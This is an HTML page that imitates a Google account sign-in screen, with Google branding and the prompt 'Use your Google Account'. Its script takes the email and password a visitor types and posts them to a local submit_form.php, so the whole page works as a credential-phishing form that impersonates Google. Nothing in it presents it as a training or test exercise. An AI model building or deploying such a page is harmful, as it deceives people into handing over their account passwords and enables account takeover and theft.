<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Form</title>
    <link rel="stylesheet" href="google.css">
    <style>
        .logo img {
            max-width: 100px; /* Adjust the size as needed */
            height: auto;
        }
    </style>
</head>
<body>

    <div class="box">
        <div class="logo">
            <img src="IMG_0179.jpeg" alt="Google Logo">
        </div>
        <h2>Sign In</h2>
        <p>Use your Google Account</p>
        <form id="signinForm" onsubmit="submitForm(event)">
            <div class="inputBox">
                <input type="email" name="email" required onkeyup="this.setAttribute('value', this.value);"  value="">
                <label>Username</label>
            </div>
            <div class="inputBox">
                <input type="password" name="password" required onkeyup="this.setAttribute('value', this.value);" value="">
                <label>Password</label>
            </div>
            <input type="submit" name="sign-in" value="Sign In">
        </form>
        <div id="result"></div>

        <script>
            function submitForm(event) {
                event.preventDefault();
                var formData = new FormData(document.getElementById("signinForm"));
                
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "submit_form.php", true);
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4 && xhr.status === 200) {
                        document.getElementById("result").innerHTML = xhr.responseText;
                    }
                };
                xhr.send(formData);
            }
        </script>
    </div>

</body>
</html>
